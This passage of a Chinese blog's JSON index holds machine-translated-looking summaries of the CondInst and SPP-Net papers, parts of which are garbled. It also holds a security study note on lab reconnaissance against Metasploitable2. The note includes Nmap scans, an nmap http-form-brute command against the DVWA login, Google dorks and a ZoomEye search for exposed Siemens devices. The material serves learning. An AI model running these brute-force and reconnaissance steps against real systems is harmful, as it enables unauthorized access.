w.r.t.A，这可能很困难，因为它们在外观。因此，ROI操作用于裁剪感兴趣的人，即A；并过滤掉B，实例分段需要两种类型的in队形： 1） 用于对对象进行分类的外观信息； 2）用于区分属于同一类别的多个对象的位置信息。几乎所有的方法都依赖于ROI裁剪，对实例的位置信息进行显式编码。相比之下，CondInst通过使用敏感卷积滤波器以及显示在特征地图上的相对坐标来利用位置信息。 因此，我们提倡一种新的解决方案，即使用实例感知FCNs进行实例任务预测。换言之，与使用一组固定卷积滤波器的标准ConvNet作为掩码头来预测所有实例，而是根据要预测的实例来调整网络参数。在动态过滤网络[20]和CondConv[41]的启发下，对于每个实例，控制器子网络（见图3）动态生成掩码FCN网络参数（以实例的中心区域为条件），然后使用该参数预测该实例的掩码。预计网络参数可以对该实例的特征（例如相对位置、形状和外观）进行编码，并且只对该实例的像素进行激发，从而绕过了上述困难。这些条件掩模头被应用到整个特征映射中，消除了对ROI操作的需要。乍一看，这个想法可能行不通，因为如果某些图像包含多达几十个实例，则实例掩码头可能会产生大量的网络参数。然而，我们发现，一个非常紧凑的FCN掩模头和动态生成的滤波器已经可以优于先前基于ROI的mask R-CNN，从而大大降低了Mask-CNN中掩模头的每一瞬间的计算复杂度。 0x04 主要贡献 试图从一个新的角度来解决实例分割问题。为此，我们提出了CondInst实例分割框架，该框架比现有的Mask R-CNN等方法在提高实例分割速度的同时，提高了实例分割的性能。据我们所知，这是第一次一个新的实例分割框架在精确度和速度上都优于最新的技术 CondInst是完全卷积的，并且避免了许多现有方法中使用的上述调整大小操作，因为CondInst不依赖ROI。不必调整特征图的大小，就可以获得高分辨率的分辨率，并具有更精确的边缘。 与以前的方法不同，一旦训练完所有实例，掩码头中的过滤器都是固定的，而我们的掩码头中的过滤器是动态生成的，并根据实例进行调整。因此，只需记住一个过滤器，就可以大大减少所要求的过滤器的负载。因此，Mask head 可以非常轻量，显著减少推理时间。与bounding box检测器FCOS相比，CondInst只需要多10%的计算时间，甚至可以处理每个图像的最大实例数（即100个实例）。 0x05 CondInst的实例分割 ¶1x01 网络总体结构 回想一下mask R-CNN使用一个对象检测器来预测输入图像中实例的边界框。边界框实际上就是掩码R-CNN表示实例的方式。类似地，CondInst使用实例感知过滤器来表示实例。换句话说，CondInst没有将实例概念编码到边界框中，而是隐式地将其编码到掩码头的参数中，这是一种更灵活的方式。例如，它可以很容易地表示不规则的形状，而这些不规则形状是很难被表示的,）被边界框紧紧包围。这是CondInst相对于以前基于ROI的方法的优势之一。 与基于ROI的方法获取边界框的方式类似，实例感知滤波器也可以通过对象检测器获得。在这项工作中，由于CondInst的简单性和灵活性，CondInst在流行的目标检测器FCOS上构建CondInst。同时，在FCOS中消除锚盒也可以节省参数的数目和条件的计算量。如图 利用特征金字塔网络的特征映射{P3、P4、P5、P6、P7}，其下采样率分别为8、16、32、64和128。如图3所示，在FPN的每个特征层上，应用一些功能层（在虚线框中）来进行实例相关的预测。例如，目标实例的类和实例的动态生成的筛选器。从这个意义上讲，CondInst可以看作是Mask R-CNN，它们都是先处理图像中的实例，然后预测实例的像素级掩码（即实例优先），除了检测器，如图所示，还有一个掩模分支，它提供了我们生成的掩码头作为输入来预测所需实例掩码的特征映射。 特征图表示为： 掩模分支连接到FPN level p3，因此其输出分辨率为输入图像分辨率的18。掩模分支在最后一层之前有四个3×3的卷积，有128个通道。之后，为了减少生成参数的数量，掩码分支的最后一层将信道数从128减少到8（即，Cmask＝8）。令人惊讶的是，使用cmask=8已经可以获得优异的性能，而使用更大的cmask（例如16）并不能提高性能，如我们的实验所示。更严重的是，使用cmask=2只会使mask AP的性能降低0.3%。此外，如图3所示，fmaski与坐标图相结合，这些坐标是fmask上所有位置到位置（x，y）的相对坐标（即，生成遮罩头的滤波器的位置）。然后，将组合发送到掩码头以预测实例掩码。如我们的实验所示，相对坐标为预测实例掩模提供了强有力的线索。此外，单个sigmoid被用作掩模头的最终输出，因此掩模预测是类无关的。实例的类别由分类头与控制器并行预测。 原始掩模预测的分辨率与F mask的分辨率相同，后者是输入图像分辨率的八分之一。为了产生高分辨率的实例掩模，使用双线性上采样将maskprediction上采样到4，得到400×512掩模预测（如果输入图像大小为800×1024）。我们将在实验中证明上采样对CondInst的最终瞬间分段性能至关重要。需要注意的是，该掩模的分辨率比掩模R-CNN（如前所述仅为28×28）高得多。 ¶1x02 网络输出和训练标签 CondInst 具有如下的输出头： Classiofication Head： 分类头预测实例的分类，ground-truth标签为类别信息或者0（背景）即背景）。在FCOS中，网络预测一个C-D vector px,yp_{x,y}px,y​用于分类，每个元素在px,yp_{x,y}px,y​对应于一个二进制分类器，其中C表示类别的数量。 Controller Head 控制器头与上述分类头具有相同的结构，用于预测该位置实例的Mask head的参数。Mask head 预测这个物体Mask。为了预测参数，我们将滤波器的所有参数（即权重和偏差）串联在一起作为一个N-D向量 θx,y\\theta_{x,y}θx,y​，其中N是参数的总数。因此，控制器头部没有输出信道。掩模头是一种非常紧凑的fcn结构，它有三个1×1的卷积，每个卷积有8个通道，除了最后一个外，都使用ReLU作为激活函数。这里没有使用诸如批处理规范化之类的规范化层。最后一层有1个输出信道，使用sigmoid来预测前景的概率。任务头总共有169个参数（#权重=（8+2）×8（conv1）+8×8（conv2）+8×1（conv3）和#biaes=8（conv1）+8（conv2）+1（conv3））。如前所述，生成的过滤器包含关于实例所在位置的信息，因此，理想情况下，带有过滤器的遮罩头将只对实例的像素点进行触发，甚至将整个特征映射作为输入。 Center-ness and Box Heads. 从概念上讲，CondInst可以消除box head，因为CondInst不需要ROIs。然而，我们发现如果使用基于Box的NMS，推理时间将大大减少。因此，我们仍然预测CondInst中的Box。我们要强调的是，预测框仅在NMS中使用，不涉及任何ROI操作。 ¶1x03 损失函数 ¶1x04 推理 给定一幅输入图像，通过网络进行转发，得到包含分类置信度的输出px,yp_{x,y}px,y​, 中心度得分，box预测 tx,yt_{x,y}tx,y​和生成的参数θx,y\\theta_{x,y}θx,y​, 我们首先按照FCOS中的步骤来获得Box。然后，使用阈值为0.6的基于Box的NMS来消除重复检测，然后使用前100个框计算掩码。与FCOS不同，这些方框还与控制器生成的过滤器相关联。让我们假设在NMS之后还有K个box，因此我们有生成的K个过滤器组。这一组滤波器用于产生特定于实例的Mask-head。这些特定于实例的掩码头以FCNs的方式应用于与Fx,yF_{x,y}Fx,y​（即FmaskF_{mask}Fmask​,Ox,yO_{x,y}Ox,y​的组合）来预测实例的掩码。由于任务头是一个非常紧凑的网络（3个1×1卷积，共有8个信道和169个参数），计算掩码的开销非常小。例如，即使有100次检测（即MS-COCO上每个图像的最大检测次数），掩模头上总共也只有不到5毫秒的时间，这只给基本检测器FCOS增加了10%的计算时间。相比之下，Mask R-CNN的Mask head有4个3×3的256个通道，参数大于2.3M，计算时间较长。 0x06 小结 提出了一个新的更简单的实例分割框架Condinst。不同于以往的方法，如Mask R-CNN，它使用固定权重的任务头，CondInst将掩码头设置在实例上，并动态生成掩码头的过滤器。这不仅降低了掩模头的参数和计算复杂度，而且消除了ROI操作，从而形成了一个更快、更简单的实例分割框架。","categories":[{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]},{"title":"空间金字塔池化网络SPP-Net","slug":"空间金字塔池化网络SPP-Net","date":"2020-10-29T12:57:31.000Z","updated":"2020-11-09T00:24:27.258Z","comments":true,"path":"2020/10/29/空间金字塔池化网络SPP-Net/","link":"","permalink":"http://example.com/2020/10/29/%E7%A9%BA%E9%97%B4%E9%87%91%E5%AD%97%E5%A1%94%E6%B1%A0%E5%8C%96%E7%BD%91%E7%BB%9CSPP-Net/","excerpt":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。","text":"@[toc] ¶0x01概要介绍 现有的深卷积神经网络（CNNs）需要一个固定大小（如224×224）的输入图像。这种要求是“人为的”，可能会降低对任意大小/比例的图像或子图像的识别精度。在这项工作中，我们为网络配备了另一种池策略“空间金字塔池”，以消除上述要求。这种新的网络结构称为SPP网，它可以生成一个固定长度的表示，而不考虑图像的大小/比例。金字塔池对对象变形也很健壮。有了这些优势，SPP网应该在总体上改进所有基于CNN的图像分类方法。 SPP-net使用单一的完整图像表示而不是精细的方法实现了最先进的分类结果-调音SPP网络的强大功能在目标检测中也很重要。利用SPP网络，我们只需计算一次来自整个图像的特征映射，然后将任意区域（子图像）的特征集合起来生成固定长度的表示，以训练检测器。该方法避免了重复计算卷积特征。在处理测试图像时，我们的方法比R-CNN方法快24-102倍 引出SPP-Net的原因： 在cnn的训练和测试中存在一个技术问题：目前流行的CNNs要求输入图像大小固定（如224×224），这既限制了输入的纵横比，也限制了输入的规模图像。什么时候对于任意大小的图像，当前的方法大多是将输入图像调整为固定大小，通过裁剪或通过翘曲，如图所示。但是裁剪区域可能不包含整个对象，而扭曲的内容可能会导致不需要的几何图形扭曲。识别由于内容丢失或失真，精度可能会受到影响。 为什么需要固定尺寸？ cnn主要由两部分组成：卷积层和随后的完全连接层。卷积层以滑动窗口方式操作，并输出表示激活的空间排列的特征图（图2）。事实上，旋转层不需要固定的图像大小，可以生成任何尺寸的特征图。另一方面，完全连接的层需要有固定大小/长度的定义输入。因此，固定大小约束仅来自完全连接层. 输入本文引入空间金字塔池（SPP）来取消网络固定规模约束 ¶0x02 SPP-Net 我添加了最后一个卷积层上的SPP层。spp层将特征集合起来，生成固定长度的输出，然后输入到完全连接的层（或其他分类器）。换句话说，我们在网络层次结构的高级阶段（在进化层和完全连接层之间）执行一些信息“聚合”，以避免在开始。图1（底部）通过引入SPP层显示了网络体系结构的变化。我们称之为新的网络结构spp-net SPP的优点 SPP对于深层CNN有几个显著的特性：1）SPP能够生成固定长度的输出，而不考虑输入大小，而以前的deepnetworks中使用的滑动窗口池[3]不能；2）SPP使用多级而滑动窗口池只使用单个窗口大小。多层池对物体变形具有很强的鲁棒性[15]；3）由于输入尺度的灵活性，在可变尺度下提取的SPPcan池特征。实验表明，这些因素都提高了深层网络的识别精度。 SPP-net不仅可以从任意大小的图像/窗口生成测试的表示，而且还允许我们在训练期间提供不同大小或比例的图像。使用可变大小的图像进行训练可以提高尺度不变性并减少过拟合。我们开发了一种简单的多尺寸采集方法。当我们接受一个网络输入的单一变量时，我们使用一个固定的网络大小来训练它。在每一个纪元中，我们用一个给定的输入大小训练网络，然后切换到另一个输入大小来进行下一步操作。实验表明，这种多尺度训练与传统的单尺度训练一样收敛，具有更好的测试精度。 与R-CNN对对比： R-CNN中的特征计算是非常耗时的，因为它反复地将深度卷积网络应用于每幅图像上数千个扭曲区域的原始像素。Spp-Net可以在整个图像上运行卷积层（不考虑窗口数），然后通过SPP网络在特征地图上提取特征。注意 在特征地图（而不是图像区域）上训练/运行探测器实际上是一个更流行的想法。 但SPP网络继承了CNN深层特征映射的强大功能，同时也继承了SPP在任意窗口大小下的灵活性，从而使SPP网络具有了卓越的精度和效率。在我们的实验中，基于SPP网络的系统（建立在CNN管道上）计算的特征比R-CNN快24-102倍，具有更好的或可比性准确。有SPP网络可以促进更深层和更大的各种网络. ¶0x03 网络结构 ¶1x01 卷积层和特征图 考虑一下流行的七层架构，前五层是卷积的，其中一些是池层。这些池层也可以被认为是“卷积的”，因为它们使用的是滑动窗口。 最后的两层是完全连接的，以N路softmax作为输出，其中N是类别的数目。 上面描述的深度网络需要一个fixedimage大小。然而，我们注意到，固定尺寸的要求仅仅是由于完全连接的层需要固定长度向量作为输入。另一方面，卷积层接受轨道尺寸的输入。卷积层使用滑动过滤器，其输出与输入的aspectratio大致相同。这些输出被称为特征映射[1]——它们不仅涉及到响应的强度，而且涉及到它们的空间位置。 将一些特征地图可视化。它们是由conv5layer的一些过滤器生成的。图2（c）显示了ImageNet数据集中这些过滤器的最强激活图像。我们看到过滤器可以被一些语义内容激活。例如，第55个滤波器（图2，左下角）最易被圆形激活；第66个滤波器（图2，右上角）最易被∧形激活；第118个滤波器（图2，右下角）最易被a∨激活-形状。这些输入图像中的形状（图2（a））激活相应位置的特征映射（图2中的箭头） 生成图2中的featuremaps，而不需要固定输入大小。这些由深卷积层生成的特征映射与传统方法中的特征映射相似[27]，[28]。在这些方法中，SIFT向量[29]或图像块[28]被密集地提取和编码，例如通过矢量量化、稀疏编码或费希尔核进行编码。这些编码的特征由特征映射组成，然后由词包（BoW）或空间金字塔集合。类似地，深卷积特征可以以类似的方式汇集在一起。 ¶1x02 空间金字塔池层 这样的向量可以通过单词包（BoW）方法生成，该方法将这些特征集合在一起。空间金字塔池[14]，[15]改进了BoW，因为它可以通过在局部空间容器中的池来保持空间信息。这些空间存储单元的大小与图像大小成比例，因此无论图像大小，存储单元的数量都是固定的。这与以前的深层网络的滑动窗口池[3]不同，其中滑动窗口的数量取决于输入大小。到对于任意大小的图像采用深网络，我们将最后一个池层（例如，在最后一个卷积层之后的pool5）替换为aspatialpyramd池层。图3说明了方法。输入每一个空间单元，我们将每个滤波器的响应集中起来（在本文中我们使用最大池），空间金字塔池的输出是km维向量，其中格数表示为sm（kis是最后一个卷积层中的滤波器数）。固定维向量被输入到全连通层。 ¶0x04 训练网络 Spp-Net的训练过程分为两部 ¶1x01 单一尺度训练——single-size 所谓单一尺寸训练指的是先只对一种固定输入图像进行训练，比如224 x 224，在conv5之后的特征图为：13x13这就是我们的（a x a）而我要得到的输出为4 x 4，2 x 2,1 x 1，怎么办呢？这里金字塔层bins即为 n x n，也就是4 x 4，2 x 2,1 x 1，我们要做的就是如何根据a和n设计一个池化层，使得a x a的输入能够得到n x n的输出。实际上这个池化层很好设计，我们称这个大小和步幅会变化的池化层为sliding window pooling。 它的大小为：windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整。数据实验如下： 当a x a为13 x 13时，要得到4 x 4的输出，池化层的大小为4，移动步幅为3； 当a x a为13 x 13时，要得到2 x 2的输出，池化层的大小为7，移动步幅为6； 当a x a为13 x 13时，要得到1 x 1的输出，池化层的大小为13，移动步幅为13； 有的小伙伴一定发现，那如果我的输入a x a变化为10 x 10呢，此时再用上面的三个池化核好像得不到固定的理想输出啊，事实上的确如此，这是训练的第二个过程要讲的，因为此过程称之为“单一尺度训练”，针对的就是某一个固定的输入尺度而言的。 ¶1x02 多尺寸训练——multi-size（以两种尺度为例） 虽然带有SPP（空间金字塔）的网络可以应用于任意尺寸，为了解决不同图像尺寸的训练问题，我们往往还是会考虑一些预设好的尺寸，而不是一些尺寸种类太多，毫无章法的输入尺寸。现在考虑这两个尺寸：180×180,224×224，此处只考虑这两个。 我们使用缩放而不是裁剪，将前述的224的区域图像变成180大小。这样，不同尺度的区域仅仅是分辨率上的不同，而不是内容和布局上的不同。 那么对于接受180输入的网络，我们实现另一个固定尺寸的网络。在论文中，conv5输出的特征图尺寸是axa=10×10。我们仍然使用windows_size=[a/n] 向上取整 ， stride_size=[a/n]向下取整，实现每个金字塔池化层。这个180网络的空间金字塔层的输出的大小就和224网络的一样了。 当a x a为10 x 10时，要得到4 x 4的输出，池化层的大小为3，移动步幅为2（注意：此处根据这样的一个池化层，10 x 10的输入好像并得不到4 x 4的输出，9 x 9或者是11 x 11的倒可以得到4 x 4的）这个地方我也还不是特别清楚这个点，后面我会说出我的个人理解。 当a x a为10 x 10时，要得到2 x 2的输出，池化层的大小为5，移动步幅为5； 当a x a为10 x 10时，要得到1 x 1的输出，池化层的大小为10，移动步幅为10； 这样，这个180网络就和224网络拥有一样的参数了。换句话说，训练过程中，我们通过使用共享参数的两个固定尺寸的网络实现了不同输入尺寸的SPP-net。 为了降低从一个网络（比如224）向另一个网络（比如180）切换的开销，我们在每个网络上训练一个完整的epoch，然后在下一个完成的epoch再切换到另一个网络（权重保留）。依此往复。实验中我们发现多尺寸训练的收敛速度和单尺寸差不多。 多尺寸训练的主要目的是在保证已经充分利用现在被较好优化的固定尺寸网络实现的同时，模拟不同的输入尺寸。除了上述两个尺度的实现，我们也在每个epoch中测试了不同的s x s输入，s是从180到224之间均匀选取的。后面将在实验部分报告这些测试的结果。 注意，上面的单尺寸或多尺寸解析度只用于训练。在测试阶段，是直接对各种尺寸的图像应用SPP-net的。 ¶0x05 Spp-Net在目标检测上的应用 SPP网络，这个方法的思想在R-CNN、Fast RCNN， Faster RCNN上都起了举足轻重的作用，对于检测算法，论文中是这样做到：使用ss生成~2k个候选框，缩放图像min(w,h)=s之后提取特征，每个候选框使用一个4层的空间金字塔池化特征，网络使用的是ZF-5的SPPNet形式。之后将12800d的特征输入全连接层，SVM的输入为全连接层的输出。这个算法可以应用到多尺度的特征提取：先将图片resize到五个尺度：480，576，688，864，1200，加自己6个。然后在map window to feature map一步中，选择ROI框尺度在｛6个尺度｝中大小最接近224x224的那个尺度下的feature maps中提取对应的roi feature。这样做可以提高系统的准确率。","categories":[{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]},{"title":"【白帽子学习笔记】网络扫描与网络侦查","slug":"【白帽子学习笔记】网络扫描与网络侦查","date":"2020-10-29T03:17:44.000Z","updated":"2020-12-19T05:03:41.055Z","comments":true,"path":"2020/10/29/【白帽子学习笔记】网络扫描与网络侦查/","link":"","permalink":"http://example.com/2020/10/29/%E3%80%90%E7%99%BD%E5%B8%BD%E5%AD%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E7%BD%91%E7%BB%9C%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%BD%91%E7%BB%9C%E4%BE%A6%E6%9F%A5/","excerpt":"[toc] 0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。","text":"[toc] 0x01网络扫描与网络侦查的目的 黑客在进行一次完整的攻击之前除了确定攻击目标之外，最主要的工作就是收集尽量多的关于攻击目标的信息。这些信息主要包括目标的操作系统类型及版本、目标提供哪些服务、各服务的类型、版本以及相关的社会信息。 攻击者搜集目标信息一般采用七个基本的步骤： （1） 找到初始信息，比如一个IP地址或者一个域名； （2） 找到网络地址范围，或者子网掩码； （3） 找到活动机器； （4） 找到开放端口和入口点； （5） 弄清操作系统； （6） 弄清每个端口运行的是哪种服务； （7） 找到目标可能存在的漏洞。 0x02 常用工具介绍 ¶1x01 Google Hack Google Hacking 是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是mdb文件下载，CMS 未被锁定install页面，网站配置密码，php远程文件包含漏洞等重要信息。 我在以前写过一篇Goolge Hack基本语法的介绍博客。 链接如下：【白帽子学习笔记10】Google语法 ¶1x02 Nmap Nmap是一个网络侦察和安全扫描程序，系统管理者和个人可以使用这个软件扫描大型的网络，获取哪台主机正在运行以及提供什么服务等信息。Nmap支持很多扫描技术，例如：UDP、TCP connect()、TCP SYN(半开扫描)、ftp代理(bounce攻击)、反向标志、ICMP、FIN、ACK扫描、圣诞树(Xmas Tree)、SYN扫描和null扫描。Nmap还提供了一些高级的特征，例如：通过TCP/IP协议栈特征探测操作系统类型，秘密扫描，动态延时和重传计算，并行扫描，通过并行ping扫描探测关闭的主机，诱饵扫描，避开端口过滤检测，直接RPC扫描(无须端口映射)，碎片扫描，以及灵活的目标和端口设定。 Nmap运行通常会得到被扫描主机端口的列表。Nmap总会给出well known端口的服务名(如果可能)、端口号、状态和协议等信息。每个端口的状态有：open、filtered、unfiltered。open状态意味着目标主机能够在这个端口使用accept()系统调用接受连接。filtered状态表示：防火墙、包过滤和其它的网络安全软件掩盖了这个端口，禁止Nmap探测其是否打开。unfiltered表示：这个端口关闭，并且没有防火墙/包过滤软件来隔离nmap的探测企图。通常情况下，端口的状态基本都是unfiltered状态，只有在大多数被扫描的端口处于filtered状态下，才会显示处于unfiltered状态的端口。 根据使用的功能选项，Nmap也可以报告远程主机的下列特征：使用的操作系统、TCP序列、运行绑定到每个端口上的应用程序的用户名、DNS名、主机地址是否是欺骗地址、以及其它一些东西。 ¶1x03 Winhex WinHex 是一款以通用的 16 进制编辑器为核心，专门用来对付计算机取证、数据恢复、低级数据处理、以及 IT 安全性、各种日常紧急情况的高级工具： 用来检查和修复各种文件、恢复删除文件、硬盘损坏、数码相机卡损坏造成的数据丢失等。 ¶1x04 Metasploit Metasploit是一个渗透测试框架，里面集合了很多的渗透测试功能。我关于Metasploit也写过一篇博客，链接如下： 白帽子学习笔记18】Metasploit学习笔记 0x03 被动扫描 ¶1x01 麻省理工学院网站中文件名包含“network security”的pdf文档 首先我们先来构造一下谷歌语法： inurl:mit.edu intext:network security filetype:pdf inurl:mit.edu 表示搜索结果的url中包含mit.edu intext:network security 表示搜索的结果中包括network security filetype:pdf 表示搜索结果中的文件类型为pdf ¶1x02 照片信息解析 根据一张照片找出这个女孩在哪里旅行。 首先先看照片中的文字，然后可以看到一些文字，尝试将这些内容在Google 地图中进行搜索。 但是仔细一看发现不太对劲。这个图片不太一样啊。 最后尝试改变一下时间轴找到了在2015年时候的装潢是和图片中一样的。 这个是位置信息。 ¶1x03 手机位置定位 手机位置定位。通过LAC（Location Area Code，位置区域码）和CID（Cell Identity，基站编号，是个16位的数据（范围是0到65535）可以查询手机接入的基站的位置，从而初步确定手机用户的位置。 获取自己手机的LAC和CID： Android 获取方法：Android： 拨号*#*#4636#*#*进入手机信息工程模式后查看 iphone获取方法：iPhone：拨号*3001#12345#*进入FieldTest 但是请注意，这个操作在很多品牌的新版本中已经不能用了，比如华为和OPPO等。 ¶1x04 编码解码 将Z29vZCBnb29kIHN0dWR5IQ==解码 很明显的Base64解码 ¶1x05 地址信息 通过随便一个MAC地址查询网站就可以确定此MAC地址为苹果品牌 之后需要确定202.193.64.34到底是那个网页，发现直接访问不行。所以查询一下这个IP地址。 嗯于是就是猜测这个会不会不是桂电的官网呢？ 我们去ping一下桂电的官网，发现果然如此。 得出结论，这是一个苹果设备访问了桂电的主页。 首先我的IP地址是113.13.35.21 但是通过ifconfig查询到到本机ip地址为： 10.33.17.179 这两个都是我的IP地址，为什么会不一样呢？ 因为10.33.17.179是我的内网网址，而当我访问https://whatismyipaddress.com的时候，这个网址的主机是在外网的，我的数据包需要经过路由器将信息传输到外网当中，所以这个网页中获取的就是经过路由器转换后的外网地址。 0x04 NMAP扫描Metasploitable2漏洞 ¶1x01 NMAP扫描Metasploitable2端口开放情况 首先我们需要两个虚拟机设备，并让两台设备置于同一网段 可以看到两者位于同一网段，我这里是两台设备同时设置在了虚拟机到Net模式下。 下面使用Nmap进行扫描。 可以看到开放了那么多的端口，不同的端口分别对于不同服务。 端口号 服务 ftp 远程文件传输 ssh 远程连接 telnet 远程登陆协议 smtp 提供可靠且有效的电子邮件传输协议 domain 将域名和IP地址相互映射 http 超文本传输协议 rpcbind rpcbind与BIND或实际上与任何DNS服务器非常相似。当使用将RPC接口的声明编译为服务器和客户端存根代码时，会选择或获得一个协议号rpcgen。 netbios-ssn 面向连接通信提供会话服务 microsoft-ds 远程登陆端口 exec exec函数族的函数执行成功后不会返回 login 登陆 shell Shell 是指一种应用程序，这个应用程序提供了一个界面，用户通过这个界面访问操作系统内核的服务 rmiregistry 用于不同虚拟机之间的通信 ingreslock Ingreslock后门程序监听在1524端口，连接到1524端口就可以直接获得root权限 nfs 通过网络，让不同的机器、不同的操作系统可以共享彼此的文件 ccproxy-ftp 主要用于局域网内共享宽带上网，ADSL共享上网、专线代理共享、ISDN代理共享、卫星代理共享、蓝牙代理共享和二级代理等的文件传输 mysql 数据库 postgresql 关系数据库服务器 vnc 远程连接（有GUI图像界面） X11 X11也叫做X Window系统，X Window系统 (X11或X)是一种 位图 显示的 视窗系统 irc 一种网络聊天协议 ajp13 定向包协议 ¶1x02 NMAP扫描Metasploitable2操作系统类型 使用 nmap -O IP即可扫描操作系统信息。扫描结果如下图 ¶1x03 NMAP穷举Metasploitable2上DVWA的登陆账号和密码 通过扫描我们可以知道Metasploitable2开放了80的端口，DVWA是网页服务器而且上面也没有开启443端口所有就肯定在80端口了。 接下来选择nmap自带的http暴力破解工具 http-form-brute 选择路径为：/dvwa/login.php 组成的命令为： nmap -p 80 -script=http-form-brute -script-args=http-form-brute.path=/dvwa/login.php 10.34.80.4 ¶1x04 永恒之蓝-WannaCry蠕虫 WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件。蠕虫病毒是一种常见的计算机病毒，是无须计算机使用者干预即可运行的独立程序，它通过不停的获得网络中存在漏洞的计算机上的部分或全部控制权来进行传播。此病毒通过远程高危漏洞进行自我传播复制,并且加密文件采用了高强度的双RSA+AES加密,至少目前来说破解秘钥是不可能的,只能通过预防的方式来防御,勤打补丁,关闭445、139等端口,及时安装安全软件。 0x05 ZoomEye搜索一个西门子工控设备 在ZoomEye中搜索西门子工控设备，点击一个可以看到该IP设备的如下信息 该设备开启了FTP端口可能会面临被不法分子获取FTP远程连接密码导致重要文件泄漏的问题，也开放了80和443端口说明可能有Web端，Web端的漏洞也可能导致系统遭到攻击。 0x06 数据恢复与取证 ¶1x01 修复elephant.jpg 用16进制编辑器打开后可以发现文件头明显不符合JPG的格式。手动给改回来。 JPG文件头： FF D8 FF E0 成功修复 ¶1x02 笑脸后的阴霾 用16进制查看器拿到最后可以发现：tom is the killer. 太可怕了～～ ¶1x04 使用数据恢复软件恢复U盘文件 目前网络中的U盘数据工具很多，我使用了一个叫做嗨格式的U盘恢复软件，效果还挺不错的，操作也很简单。 0x07 小结 通过对本篇博文的总结我们可以学习到如下内容： Google语法在信息搜索中的应用 图像信息提取能力 Nmap常用操作 Winhex等16进制软件的使用（文件修复，查看隐藏信息） 通过这些内容我们可以对网络扫描和网络侦查有一个很好的了解。","categories":[{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"}]}],"categories":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"security","slug":"security","permalink":"http://example.com/categories/security/"},{"name":"CV","slug":"CV","permalink":"http://example.com/categories/CV/"}],"tags":[{"name":"信息安全数学基础","slug":"信息安全数学基础","permalink":"http://example.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/"},{"name":"security","slug":"security","permalink":"http://example.com/tags/security/"},{"name":"CV","slug":"CV","permalink":"http://example.com/tags/CV/"}]}